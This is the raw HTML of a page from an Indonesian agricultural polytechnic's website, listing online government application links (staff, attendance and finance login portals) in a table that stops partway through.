      <style type="text/css">
#pojo-a11y-toolbar .pojo-a11y-toolbar-toggle a{ background-color: #4054b2;	color: #ffffff;}
#pojo-a11y-toolbar .pojo-a11y-toolbar-overlay, #pojo-a11y-toolbar .pojo-a11y-toolbar-overlay ul.pojo-a11y-toolbar-items.pojo-a11y-links{ border-color: #4054b2;}
body.pojo-a11y-focusable a:focus{ outline-style: solid !important;	outline-width: 1px !important;	outline-color: #FF0000 !important;}
#pojo-a11y-toolbar{ top: 100px !important;}
#pojo-a11y-toolbar .pojo-a11y-toolbar-overlay{ background-color: #ffffff;}
#pojo-a11y-toolbar .pojo-a11y-toolbar-overlay ul.pojo-a11y-toolbar-items li.pojo-a11y-toolbar-item a, #pojo-a11y-toolbar .pojo-a11y-toolbar-overlay p.pojo-a11y-toolbar-title{ color: #333333;}
#pojo-a11y-toolbar .pojo-a11y-toolbar-overlay ul.pojo-a11y-toolbar-items li.pojo-a11y-toolbar-item a.active{ background-color: #4054b2;	color: #ffffff;}
@media (max-width: 767px) { #pojo-a11y-toolbar { top: 50px !important; } }</style><style id="custom-background-css">
body.custom-background { background-color: #fcfcfc; }
</style>
<meta name="generator" content="Powered by Slider Revolution 5.4.8.3 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<link rel="icon" href="https://pepi.ac.id/wp-content/uploads/2020/01/cropped-logo-32x32.png" sizes="32x32" />
<link rel="icon" href="https://pepi.ac.id/wp-content/uploads/2020/01/cropped-logo-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://pepi.ac.id/wp-content/uploads/2020/01/cropped-logo-180x180.png" />
<meta name="msapplication-TileImage" content="https://pepi.ac.id/wp-content/uploads/2020/01/cropped-logo-270x270.png" />
<script type="text/javascript">function setREVStartSize(e){									
						try{ e.c=jQuery(e.c);var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
							if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})					
						}catch(d){console.log("Failure at Presize of Slider:"+d)}						
					};</script>
<style id="velocityoption-dynamic-css" title="dynamic-css" class="redux-options-output">.container{width:1040px;}body{font-family:Roboto;line-height:23px;font-weight:500;font-style:normal;color:#444444;font-size:14px;}body a{color:#2f451e;}body a:hover{color:#333;}body a:active{color:#333;}body{background-color:#ffffff;}</style></head>

<body data-rsssl=1 class="wp-singular page-template-default page page-id-618 custom-background wp-theme-vsstem vsstem fl-theme-builder-header fl-theme-builder-footer fl-theme-builder-singular">

<header class="fl-builder-content fl-builder-content-6 fl-builder-global-templates-locked" data-post-id="6" itemscope="itemscope" itemtype="http://schema.org/WPHeader" data-type="header" data-sticky="1" data-shrink="0" data-overlay="0" data-overlay-bg="transparent"><div class="fl-row fl-row-fixed-width fl-row-bg-photo fl-node-60af152aaed33" data-node="60af152aaed33">
	<div class="fl-row-content-wrap">
						<div class="fl-row-content fl-row-fixed-width fl-node-content">
		
<div class="fl-col-group fl-node-60bcc5dc2293c" data-node="60bcc5dc2293c">
			<div class="fl-col fl-node-60bcc5dc229aa" data-node="60bcc5dc229aa">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-separator fl-node-60bcc5dc228f1" data-node="60bcc5dc228f1">
	<div class="fl-module-content fl-node-content">
		<div class="fl-separator"></div>
	</div>
</div>
	</div>
</div>
	</div>

<div class="fl-col-group fl-node-60af152ab1844" data-node="60af152ab1844">
			<div class="fl-col fl-node-60af152ab18ce" data-node="60af152ab18ce">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-menu fl-node-5fcf3b6509124" data-node="5fcf3b6509124">
	<div class="fl-module-content fl-node-content">
		<div class="fl-menu fl-menu-responsive-toggle-medium-mobile">
	<button class="fl-menu-mobile-toggle text"><span class="fl-menu-mobile-toggle-label" aria-label="Menu">Menu</span></button>	<div class="fl-clear"></div>
	<ul id="menu-menu-1" class="menu fl-menu-horizontal fl-toggle-arrows"><li id="menu-item-529" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/beranda/">Beranda</a></li><li id="menu-item-60" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/profile/">Profile</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-206" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/sejarah/">Sejarah</a></li>	<li id="menu-item-208" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/profile/visi-dan-misi/">Visi dan Misi</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-3272" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kementerian-pertanian/">Kementerian Pertanian</a></li>		<li id="menu-item-3278" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/politeknik-enjiniring-pertanian-indonesia/">Profil Politeknik Enjiniring Pertanian Indonesia</a></li></ul></li>	<li id="menu-item-1336" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/tugas-dan-fungsi/">Tugas dan Fungsi</a></li>	<li id="menu-item-209" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/tujuan/">Tujuan</a></li>	<li id="menu-item-205" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/lambang/">Lambang</a></li>	<li id="menu-item-207" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/struktur-organisasi/">Struktur Organisasi</a></li>	<li id="menu-item-2182" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/info-pejabat/">Profil Pejabat</a></li>	<li id="menu-item-5814" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/role-mode-agen-perubahan/">Role Mode &#038; Agen Perubahan</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-5813" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/role-mode/">Role Mode</a></li>		<li id="menu-item-5818" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/agen-perubahan/">Agen Perubahan</a></li></ul></li></ul></li><li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/program/">Program</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-269" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/laporan-keuangan/">Laporan Keuangan</a></li>	<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/program/dipa/">DIPA</a></li>	<li id="menu-item-229" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/program/renstra/">RENSTRA</a></li>	<li id="menu-item-1406" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/rincian-kertas-kerja-satker-rkkl/">Rencana Kinerja Tahunan</a></li>	<li id="menu-item-268" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/lakin-lakip/">Lakin/Lakip</a></li>	<li id="menu-item-270" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/laporan-tahunan/">Laporan Tahunan</a></li>	<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/kinerja/">Kinerja</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-267" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/capaian-kinerja/">Capaian Kinerja</a></li>		<li id="menu-item-274" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/realisasi-anggaran/">Realisasi Anggaran</a></li>		<li id="menu-item-273" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/neraca-keuangan/">Neraca Keuangan</a></li></ul></li>	<li id="menu-item-204" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/kerjasama/">Kerjasama</a></li>	<li id="menu-item-442" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/lhkpn-asn/">LHKPN/ASN</a></li>	<li id="menu-item-275" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/survei-kepuasan-masyarakat/">Survei Kepuasan Masyarakat</a></li>	<li id="menu-item-272" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kinerja/laporan-tahunan-ppid/">Laporan Tahunan PPID</a></li></ul></li><li id="menu-item-56" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/arsip/">Arsip</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-4172" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://pepi.ac.id/agenda/">Agenda</a></li>	<li id="menu-item-318" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://pepi.ac.id/artikel/">Artikel</a></li>	<li id="menu-item-319" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://pepi.ac.id/berita/">Berita</a></li>	<li id="menu-item-1428" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/surat-surat-perjanjian-kesepakatan/">Surat-surat perjanjian/kesepakatan</a></li>	<li id="menu-item-2479" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/peraturan-perundang-undangan-pertanian/">Peraturan Perundang-undangan Pertanian</a></li>	<li id="menu-item-203" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/hymne-dan-mars/">Hymne Dan Mars</a></li>	<li id="menu-item-321" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/arsip/gallery/">Gallery</a></li>	<li id="menu-item-322" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/arsip/media-sosial/">Media Sosial</a></li>	<li id="menu-item-325" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://pepi.ac.id/pengumuman/">Pengumuman</a></li>	<li id="menu-item-1340" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/jalur-evakuasi/">Jalur Evakuasi</a></li>	<li id="menu-item-1424" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/peringatan-dini-bencana/">Peringatan Dini Bencana</a></li></ul></li><li id="menu-item-57" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/sistem-informasi-2/">Sistem Informasi</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-55" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/akademik/">Akademik</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-4807" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/internasional/">internasional</a></li>		<li id="menu-item-304" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/akreditasi/">Akreditasi</a></li>		<li id="menu-item-307" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/akademik/prodi/">Program Studi</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">			<li id="menu-item-341" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/prodi/teknologi-mekanisasi-pertanian/">Teknologi Mekanisasi Pertanian</a></li>			<li id="menu-item-340" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/prodi/teknologi-hasil-pertanian/">Teknologi Hasil Pertanian</a></li>			<li id="menu-item-339" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/prodi/tata-air-pertanian/">Tata Air Pertanian</a></li></ul></li>		<li id="menu-item-308" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/kalender-akademik/">Kalender Akademik</a></li>		<li id="menu-item-306" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/akademik/fasilitas/">Fasilitas</a></li></ul></li>	<li id="menu-item-406" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-mahasiswa/">Sistem Informasi Mahasiswa</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-407" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-mahasiswa/bem-badan-eksekutif-mahasiswa/">Bem (Badan Eksekutif Mahasiswa )</a></li>		<li id="menu-item-408" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-mahasiswa/penelitian-mahasiswa/">Penelitian Mahasiswa</a></li></ul></li>	<li id="menu-item-405" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-kepegawaian/">Sistem Informasi Kepegawaian</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-410" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-tata-usaha/">Sistem Informasi Tata Usaha</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">			<li id="menu-item-413" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-tata-usaha/tata-naskah-dinas-elektronk/">Tata Naskah Dinas Elektronik</a></li>			<li id="menu-item-412" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-tata-usaha/data-pegawai/">Data Pegawai</a></li></ul></li></ul></li>	<li id="menu-item-401" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/sistem-informasi-2/sistem-informasi-akademik/">Sistem Informasi Akademik</a></li></ul></li><li id="menu-item-62" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/informasi-publik/">Informasi Publik</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-5425" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/">PENILAIAN OMBUSMAN</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-5430" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/ombudsman-ri/">OMBUDSMAN RI</a></li>		<li id="menu-item-6350" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kode-etik-dan-perilaku-pelayanan-publik/">KODE ETIK DAN PERILAKU PELAYANAN PUBLIK</a></li>		<li id="menu-item-5442" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/penjaminan-mutu-pelayanan/">Penjaminan Mutu Pelayanan</a></li>		<li id="menu-item-2452" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/jenis-pelayanan-spp/">Jenis Pelayanan SPP</a></li>		<li id="menu-item-5457" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/petugas-pelayanan/">Petugas Pelayanan</a></li>		<li id="menu-item-5496" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/tugas-dan-kewenangan-jabatan/">Tugas dan Kewenangan Jabatan</a></li>		<li id="menu-item-5461" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/pengetahuan-layanan-yang-ramah-kelompok-marginal-rentan/">Pengetahuan Layanan yang Ramah Kelompok Marginal / Rentan</a></li>		<li id="menu-item-5468" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/bentuk-maladministrasi/">Bentuk Maladministrasi</a></li>		<li id="menu-item-5474" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/pelaksanaan-pengaduan/">Pelaksanaan Pengaduan</a></li>		<li id="menu-item-5489" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/intrumen-evaluasi-kinerja-pelaksana/">Intrumen Evaluasi Kinerja Pelaksana</a></li>		<li id="menu-item-5505" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/penilaian-ombusman/sarana-dan-prasarana-pelayanan/">Sarana dan Prasarana Pelayanan</a></li></ul></li>	<li id="menu-item-444" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/dip/">DIP</a></li>	<li id="menu-item-1343" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/prosedur-informasi-publik/">Prosedur Informasi Publik</a></li>	<li id="menu-item-3780" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://ppid.pertanian.go.id/index.php/edocument/index/portal?arsip=0">Portal PPID</a></li>	<li id="menu-item-1396" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/komitmen-bersama/">Komitmen Bersama</a></li>	<li id="menu-item-1346" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/daftar-rancangan-peraturan/">Daftar Rancangan Peraturan</a></li>	<li id="menu-item-1413" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/daftar-aset/">Daftar Aset</a></li>	<li id="menu-item-445" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://pepi.ac.id/pengumuman-barang-jasa/">Pengumuman Barang Jasa</a></li>	<li id="menu-item-1337" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/informasi-publik/dip/tata-cara-pengaduan/">Tata Cara Pengaduan</a></li>	<li id="menu-item-2186" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profile/lokasi-kantor/">LOKASI KANTOR</a></li></ul></li><li id="menu-item-5114" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/facebook-literasi/">PERPUSTAKAAN</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">	<li id="menu-item-5737" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/profil-perpustakaan/">PROFIL PERPUSTAKAAN</a></li>	<li id="menu-item-5763" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/layanan/">LAYANAN</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-5765" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-perpustakaan/">LAYANAN PEMBUATAN KARTU</a></li>		<li id="menu-item-5793" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-baca-di-tempat/">LAYANAN BACA DI TEMPAT</a></li>		<li id="menu-item-5792" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-sirkulasi/">LAYANAN SIRKULASI</a></li>		<li id="menu-item-5791" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-referensi/">LAYANAN REFERENSI</a></li>		<li id="menu-item-5790" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-bimbingan/">LAYANAN BIMBINGAN</a></li>		<li id="menu-item-5789" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-penelusuran-koleksi/">LAYANAN PENELUSURAN KOLEKSI</a></li>		<li id="menu-item-5788" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/layanan-bebas/">LAYANAN BEBAS</a></li></ul></li>	<li id="menu-item-5758" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/e-book/">E- Book</a></li>	<li id="menu-item-5757" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/e-jurnal/">E- Jurnal</a></li>	<li id="menu-item-5750" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kontak-perpustakaan/">Kontak perpustakaan</a></li>	<li id="menu-item-5131" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://kikp-pertanian.id/pepi/opac/">opac</a></li>	<li id="menu-item-5125" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children fl-has-submenu"><div class="fl-has-submenu-container"><a href="https://pepi.ac.id/facebook-literasi/media-sosial/">Media Sosial</a><span class="fl-menu-toggle"></span></div><ul class="sub-menu">		<li id="menu-item-5111" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://www.facebook.com/profile.php?id=100080336306465&amp;locale=id_ID">Facebook Literasi</a></li>		<li id="menu-item-5112" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://www.instagram.com/perpustakaan.pepi/">Instagram Literasi</a></li>		<li id="menu-item-5113" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="https://www.youtube.com/channel/UCaEDHPm-8n0OUajtbvpnfdw">Youtube Literasi</a></li></ul></li>	<li id="menu-item-320" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://pepi.ac.id/perpustakaan/">ARTIKEL PERPUSTAKAAN</a></li></ul></li><li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://pepi.ac.id/kontak-kami/">Kontak Kami</a></li></ul></div>
	</div>
</div>
	</div>
</div>
	</div>
		</div>
	</div>
</div>
</header>
<div class="hfeed site" id="page"><div class="fl-builder-content fl-builder-content-507 fl-builder-global-templates-locked" data-post-id="507"><div class="fl-row fl-row-full-width fl-row-bg-photo fl-node-5e21543a180b6 fl-row-bg-overlay" data-node="5e21543a180b6">
	<div class="fl-row-content-wrap">
						<div class="fl-row-content fl-row-fixed-width fl-node-content">
		
<div class="fl-col-group fl-node-5e21543a18100" data-node="5e21543a18100">
			<div class="fl-col fl-node-5e21543a18141" data-node="5e21543a18141">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-heading fl-node-5e21543a17e5f" data-node="5e21543a17e5f">
	<div class="fl-module-content fl-node-content">
		<h1 class="fl-heading">
		<span class="fl-heading-text">Kumpulan Aplikasi Online</span>
	</h1>
	</div>
</div>
<div class="fl-module fl-module-html fl-node-5e215688d3b5d" data-node="5e215688d3b5d">
	<div class="fl-module-content fl-node-content">
		<div class="fl-html">
	</div>
	</div>
</div>
	</div>
</div>
	</div>
		</div>
	</div>
</div>
<div class="fl-row fl-row-fixed-width fl-row-bg-gradient fl-node-5e21543a17d4d" data-node="5e21543a17d4d">
	<div class="fl-row-content-wrap">
						<div class="fl-row-content fl-row-fixed-width fl-node-content">
		
<div class="fl-col-group fl-node-5e21543a17d99" data-node="5e21543a17d99">
			<div class="fl-col fl-node-5e21543a17ddd" data-node="5e21543a17ddd">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-fl-comments fl-node-5e21543a17ea0" data-node="5e21543a17ea0">
	<div class="fl-module-content fl-node-content">
		
<div class="comments-area" id="comments">

	
	
	
	
</div><!-- #comments -->
	</div>
</div>
<div class="fl-module fl-module-fl-post-content fl-node-5e21543a17e1e" data-node="5e21543a17e1e">
	<div class="fl-module-content fl-node-content">
		<p><strong>DAFTAR NAMA APLIKASI ONLINE</strong></p>
<table class="aligncenter alignleft" style="height: 1194px; width: 99.847%; border-collapse: collapse; border-style: double; border-color: #000000; background-color: #f5f5f5;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">1</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">SIM ASN </td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314"><a href="https://simasn.pertanian.go.id/simasn/index.php/user">https://simasn.pertanian.go.id/simasn/index.php/user</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">2</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">Epersonal</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314"><a href="https://epersonal.pertanian.go.id/login/">https://epersonal.pertanian.go.id/login/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">3</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">Ekehadiran</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314"><a href="https://ekehadiran.pertanian.go.id/index.php/login/">https://ekehadiran.pertanian.go.id/index.php/login/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">4</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">E-mutasi </td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314"><a href="https://emutasi.pertanian.go.id/index.php/login/">https://emutasi.pertanian.go.id/index.php/login/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">5</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">SAPK BKN </td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314"><a href="https://sapk.bkn.go.id/">https://sapk.bkn.go.id/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">6</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">PPID PEPI</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">https://pepi-ppid.pertanian.go.id/</td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">7</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">Survei Kepuasan Masyarakat (SKM)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="http://ikm.pertanian.go.id/admin/login">http://ikm.pertanian.go.id/admin/login</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">8</td>
<th style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">OMSPAN (Online Monitoring Sistem Perbendaharaan dan Anggaran Negara)</th>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://spanint.kemenkeu.go.id/spanint/latest/app/">https://spanint.kemenkeu.go.id/spanint/latest/app/</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">9</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">E-Rekon &amp; LK (Elektronik Rekonsiliasi dan Laporan Keuangan)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://e-rekon-lk.kemenkeu.go.id/">https://e-rekon-lk.kemenkeu.go.id/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">10</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">SAS (Sistem Akutansi Satker)</td>
